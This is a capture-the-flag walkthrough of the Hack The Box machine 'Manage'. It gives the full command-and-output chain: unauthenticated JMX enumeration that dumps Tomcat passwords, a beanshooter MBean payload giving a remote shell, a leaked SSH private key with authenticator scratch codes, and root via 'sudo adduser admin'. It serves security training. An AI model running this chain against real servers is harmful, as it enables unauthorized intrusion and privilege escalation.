# Target
| Category          | Details                                              |
|-------------------|------------------------------------------------------|
| 📝 **Name**       | [Manage](https://app.hackthebox.com/machines/Manage) |  
| 🏷 **Type**       | HTB Machine                                          |
| 🖥 **OS**         | Linux                                                |
| 🎯 **Difficulty** | Easy                                                 |
| 📁 **Tags**       | JMXRMI, Google Authenticator, admin group            |

# Scan
```
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a9:36:3d:1d:43:62:bd:b3:88:5e:37:b1:fa:bb:87:64 (ECDSA)
|_  256 da:3b:11:08:81:43:2f:4c:25:42:ae:9b:7f:8c:57:98 (ED25519)
2222/tcp  open  java-rmi   Java RMI
| rmi-dumpregistry: 
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:40397
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
8080/tcp  open  http       Apache Tomcat 10.1.19
|_http-title: Apache Tomcat/10.1.19
|_http-favicon: Apache Tomcat
40397/tcp open  java-rmi   Java RMI
44713/tcp open  tcpwrapped
```

# Attack path
1. [Gain initial foothold using unauthorized access to MBeanServer](#gain-initial-foothold-using-unauthorized-access-to-mbeanserver)
2. [Escalate to `useradmin` user using discovered SSH key and `.google_authenticator`](#escalate-to-useradmin-user-using-discovered-ssh-key-and-google_authenticator)
3. [Escalate to `root` user by creating `admin` user and group](#escalate-to-root-user-by-creating-admin-user-and-group)

### Gain initial foothold using unauthorized access to MBeanServer

#### Enumerate JMX to discover unauthorized access
```
──(magicrc㉿perun)-[~/attack/HTB Manage]
└─$ sudo docker run -it ghcr.io/qtc-de/beanshooter/beanshooter:4.1.0 enum $TARGET 2222
[+] Checking available bound names:
[+]
[+]     * jmxrmi (JMX endpoint: 127.0.1.1:33051)
[+]
[+] Checking for unauthorized access:
[+]
[+]     - Remote MBean server does not require authentication.
[+]       Vulnerability Status: Vulnerable
[+]
[+] Checking pre-auth deserialization behavior:
[+]
[+]     - Remote MBeanServer rejected the payload class.
[+]       Vulnerability Status: Non Vulnerable
[+]
[+] Checking available MBeans:
[+]
[+]     - 158 MBeans are currently registred on the MBean server.
[+]       Listing 136 non default MBeans:
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Loader,host=localhost,context=/host-manager)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=numberwriter,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.NamingResourcesMBean (Catalina:type=NamingResources,host=localhost,context=/host-manager)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/host-manager,name=HostManager,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/host-manager,name=Tomcat WebSocket (JSR356) Filter,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/manager,name=RemoteAddrValve)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/manager,name=HTTP header security filter,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Loader,host=localhost,context=/)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=GlobalRequestProcessor,name="http-nio-8080")
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/manager,name=default,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.RoleMBean (Users:type=Role,rolename="role1",database=UserDatabase)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/manager)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Loader,host=localhost,context=/manager)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=SessionExample,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/host-manager,name=Cache)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=RequestHeaderExample,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.ContextEnvironmentMBean (Catalina:type=Environment,resourcetype=Context,host=localhost,context=/examples,name=name3)
[+]       - org.apache.catalina.mbeans.NamingResourcesMBean (Catalina:type=NamingResources,host=localhost,context=/examples)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/examples,name=Cache)
[+]       - org.apache.catalina.mbeans.NamingResourcesMBean (Catalina:type=NamingResources)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/manager,name=Tomcat WebSocket (JSR356) Filter,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=stock,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/host-manager,name=StandardContextValve)
[+]       - org.apache.catalina.mbeans.ServiceMBean (Catalina:type=Service)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=jsp,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.ContextEnvironmentMBean (Catalina:type=Environment,resourcetype=Context,host=localhost,context=/examples,name=foo/name1)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/docs,name=NonLoginAuthenticator)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=ServletToJsp,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/docs,name=StandardContextValve)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/host-manager,name=HTMLHostManager,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=JspMonitor,WebModule=//localhost/manager,name=jsp,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/docs,name=RemoteAddrValve)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=async1,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/host-manager,name=default,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=async0,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Realm,realmPath=/realm0)
[+]       - org.apache.catalina.mbeans.ContextMBean (Catalina:j2eeType=WebModule,name=//localhost/docs,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=async3,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=async2,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.NamingResourcesMBean (Catalina:type=NamingResources,host=localhost,context=/manager)
[+]       - jdk.management.jfr.FlightRecorderMXBeanImpl (jdk.management.jfr:type=FlightRecorder) (action: recorder)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Deployer,host=localhost)
[+]       - org.apache.catalina.mbeans.ContextResourceMBean (Catalina:type=Resource,resourcetype=Global,class=org.apache.catalina.UserDatabase,name="UserDatabase")
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/manager,name=Manager,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Manager,host=localhost,context=/examples)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/host-manager)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/host-manager,name=BasicAuthenticator)
[+]       - org.apache.catalina.mbeans.ContextEnvironmentMBean (Catalina:type=Environment,resourcetype=Context,host=localhost,context=/examples,name=minExemptions)
[+]       - org.apache.catalina.mbeans.MemoryUserDatabaseMBean (Users:type=UserDatabase,database=UserDatabase) (action: tomcat)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/examples,name=Timing Filter,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Loader,host=localhost,context=/docs)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=UtilityExecutor)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=StringCache)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/,name=default,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=simpleimagepush,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=CompressionFilterTestServlet,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/examples,name=Tomcat WebSocket (JSR356) Filter,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.ConnectorMBean (Catalina:type=Connector,port=8080)
[+]       - org.apache.catalina.mbeans.UserMBean (Users:type=User,username="admin",database=UserDatabase)
[+]       - org.apache.catalina.mbeans.RoleMBean (Users:type=Role,rolename="manage-gui",database=UserDatabase)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Manager,host=localhost,context=/host-manager)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/host-manager,name=CSRF,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.ContextMBean (Catalina:j2eeType=WebModule,name=//localhost/manager,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,name=ErrorReportValve)
[+]       - org.apache.catalina.mbeans.ClassNameMBean (Catalina:type=ThreadPool,name="http-nio-8080")
[+]       - org.apache.catalina.mbeans.NamingResourcesMBean (Catalina:type=NamingResources,host=localhost,context=/)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/examples)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:type=Host,host=localhost)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=JspMonitor,WebModule=//localhost/host-manager,name=jsp,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/manager,name=CSRF,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:type=Engine)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=JspMonitor,WebModule=//localhost/docs,name=jsp,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/examples,name=FormAuthenticator)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=default,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Manager,host=localhost,context=/)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/manager,name=BasicAuthenticator)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/examples,name=StandardContextValve)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/docs,name=jsp,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,name=AccessLogValve)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/host-manager,name=jsp,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/,name=jsp,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=ParallelWebappClassLoader,host=localhost,context=/manager)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/manager,name=Cache)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/docs,name=Tomcat WebSocket (JSR356) Filter,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=JspMonitor,WebModule=//localhost/,name=jsp,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/examples,name=Request Dumper Filter,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Mapper)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=RequestParamExample,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.RoleMBean (Users:type=Role,rolename="admin-gui",database=UserDatabase)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=ParallelWebappClassLoader,host=localhost,context=/examples)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=ParallelWebappClassLoader,host=localhost,context=/host-manager)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,name=StandardHostValve)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/examples,name=HTTP header security filter,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/host-manager,name=RemoteAddrValve)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Realm,realmPath=/realm0/realm0)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/host-manager,name=HTTP header security filter,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Manager,host=localhost,context=/docs)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/,name=Cache)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=JspMonitor,WebModule=//localhost/examples,name=jsp,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/examples,name=RemoteAddrValve)
[+]       - com.sun.management.internal.HotSpotDiagnostic (com.sun.management:type=HotSpotDiagnostic) (action: hotspot)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=MBeanFactory)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=SocketProperties,name="http-nio-8080")
[+]       - org.apache.catalina.mbeans.ContextMBean (Catalina:j2eeType=WebModule,name=//localhost/,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=ProtocolHandler,port=8080)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,name=StandardEngineValve)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=ParallelWebappClassLoader,host=localhost,context=/docs)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=bytecounter,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/docs,name=Cache)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/docs)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=CookieExample,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.ContextMBean (Catalina:j2eeType=WebModule,name=//localhost/examples,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=HelloWorldExample,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=RequestInfoExample,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Manager,host=localhost,context=/manager)
[+]       - org.apache.catalina.mbeans.ContextMBean (Catalina:j2eeType=WebModule,name=//localhost/host-manager,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Server)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/manager,name=StandardContextValve)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Loader,host=localhost,context=/examples)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/manager,name=jsp,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/,name=StandardContextValve)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/docs,name=default,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/examples,name=Compression Filter,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/,name=NonLoginAuthenticator)
[+]       - org.apache.catalina.mbeans.NamingResourcesMBean (Catalina:type=NamingResources,host=localhost,context=/docs)
[+]       - org.apache.catalina.mbeans.ContextEnvironmentMBean (Catalina:type=Environment,resourcetype=Context,host=localhost,context=/examples,name=foo/name4)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/manager,name=Status,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/,name=Tomcat WebSocket (JSR356) Filter,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.UserMBean (Users:type=User,username="manager",database=UserDatabase)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=responsetrailer,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/manager,name=JMXProxy,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/manager,name=HTMLManager,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=ParallelWebappClassLoader,host=localhost,context=/)
[+]       - org.apache.catalina.mbeans.ContextEnvironmentMBean (Catalina:type=Environment,resourcetype=Context,host=localhost,context=/examples,name=foo/bar/name2)
[+]       - com.sun.management.internal.DiagnosticCommandImpl (com.sun.management:type=DiagnosticCommand) (action: diagnostic)
[+]
[+] Enumerating tomcat users:
[+]
[+]     - Listing 2 tomcat users:
[+]
[+]             ----------------------------------------
[+]             Username:  manager
[+]             Password:  fhErvo2r9wuTEYiYgt
[+]             Roles:
[+]                        Users:type=Role,rolename="manage-gui",database=UserDatabase
[+]
[+]             ----------------------------------------
[+]             Username:  admin
[+]             Password:  onyRPCkaG4iX72BrRtKgbszd
[+]             Roles:
[+]                        Users:type=Role,rolename="role1",database=UserDatabase
```

#### Deploy `StandardMBean`
```
┌──(magicrc㉿perun)-[~/attack/HTB Manage]
└─$ sudo docker run --rm -it ghcr.io/qtc-de/beanshooter/beanshooter:4.1.0 standard ${TARGET} 2222 tonka
[+] Creating a TemplateImpl payload object to abuse StandardMBean
[+]
[+]     Deplyoing MBean: StandardMBean
[+]     MBean with object name de.qtc.beanshooter:standard=27306920901446 was successfully deployed.
[+]
[+]     Caught NullPointerException while invoking the newTransformer action.
[+]     This is expected bahavior and the attack most likely worked :)
[+]
[+]     Removing MBean with ObjectName de.qtc.beanshooter:standard=27306920901446 from the MBeanServer.
[+]     MBean was successfully removed.
```

#### Spawn shell 
```
┌──(magicrc㉿perun)-[~/attack/HTB Manage]
└─$ sudo docker run --rm -it ghcr.io/qtc-de/beanshooter/beanshooter:4.1.0 tonka shell ${TARGET} 2222
[tomcat@10.129.250.99 /]$ id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

### Escalate to `useradmin` user using discovered SSH key and `.google_authenticator`

#### Discover SSH key and `.google_authenticator` in backup archive
```
[tomcat@10.129.250.99 /]$ mkdir /tmp/backup
[tomcat@10.129.250.99 /]$ tar -zxvf /home/useradmin/backups/backup.tar.gz -C /tmp/backup
./
./.bash_logout
./.profile
./.ssh/
./.ssh/id_ed25519
./.ssh/authorized_keys
./.ssh/id_ed25519.pub
./.bashrc
./.google_authenticator
./.cache/
./.cache/motd.legal-displayed
./.bash_history
[tomcat@10.129.250.99 /]$ cat /tmp/backup/.ssh/id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAKDh98jQtlV7BLoEEadDIQUrc5hD48KsQqyFXG9u+WaAAAAJiHKYIbhymC
GwAAAAtzc2gtZWQyNTUxOQAAACAKDh98jQtlV7BLoEEadDIQUrc5hD48KsQqyFXG9u+WaA
AAAECudKxoxJ6Vz74ca74nZArTpJUIagIpT06hEYuLpk4nkQoOH3yNC2VXsEugQRp0MhBS
tzmEPjwqxCrIVcb275ZoAAAAEHVzZXJhZG1pbkBtYW5hZ2UBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
[tomcat@10.129.250.99 /]$ cat /tmp/backup/.google_authenticator
CLSSSMHYGLENX5HAIFBQ6L35UM
" RATE_LIMIT 3 30 1718988529
" WINDOW_SIZE 3
" DISALLOW_REUSE 57299617
" TOTP_AUTH
99852083
20312647
73235136
92971994
86175591
98991823
54032641
69267218
76839253
56800775
```

#### Use discovered credentials to gain access over SSH
Use one of scratch code as verification codes.
```
┌──(magicrc㉿perun)-[~/attack/HTB Manage]
└─$ (cat <<'EOF'> id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAKDh98jQtlV7BLoEEadDIQUrc5hD48KsQqyFXG9u+WaAAAAJiHKYIbhymC
GwAAAAtzc2gtZWQyNTUxOQAAACAKDh98jQtlV7BLoEEadDIQUrc5hD48KsQqyFXG9u+WaA
AAAECudKxoxJ6Vz74ca74nZArTpJUIagIpT06hEYuLpk4nkQoOH3yNC2VXsEugQRp0MhBS
tzmEPjwqxCrIVcb275ZoAAAAEHVzZXJhZG1pbkBtYW5hZ2UBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
EOF
) && chmod 600 id_ed25519 && ssh useradmin@$TARGET -i id_ed25519
(useradmin@10.129.250.99) Verification code: 
<SNIP>
useradmin@manage:~$ id
uid=1002(useradmin) gid=1002(useradmin) groups=1002(useradmin)
```

### Escalate to `root` user by creating `admin` user and group

#### List allowed sudo commands
```
useradmin@manage:~$ sudo -l
Matching Defaults entries for useradmin on manage:
    env_reset, timestamp_timeout=1440, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User useradmin may run the following commands on manage:
    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
```

#### Identify `admin` privileged group is missing on target system
```
useradmin@manage:~$ cut -d: -f1 /etc/group | grep admin
useradmin
```

#### Add `admin` user and group
By default `adduser` will add group with same name as user.
```
useradmin@manage:~$ sudo adduser admin
Adding user `admin' ...
Adding new group `admin' (1003) ...
Adding new user `admin' (1003) with group `admin' ...
Creating home directory `/home/admin' ...
Copying files from `/etc/skel' ...
New password: 
Retype new password: 
passwd: password updated successfully
Changing the user information for admin
Enter the new value, or press ENTER for the default
        Full Name []: 
        Room Number []: 
        Work Phone []: 
        Home Phone []: 
        Other []: 
Is the information correct? [Y/n] y
```

#### Switch user to `admin`
```
useradmin@manage:~$ su admin
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@manage:/home/useradmin$ id
uid=1003(admin) gid=1003(admin) groups=1003(admin)
```

#### Use `admin` group privileges to spawn root shell using `sudo`
```
admin@manage:/home/useradmin$ sudo su
[sudo] password for admin: 
root@manage:/home/useradmin# id
uid=0(root) gid=0(root) groups=0(root)
```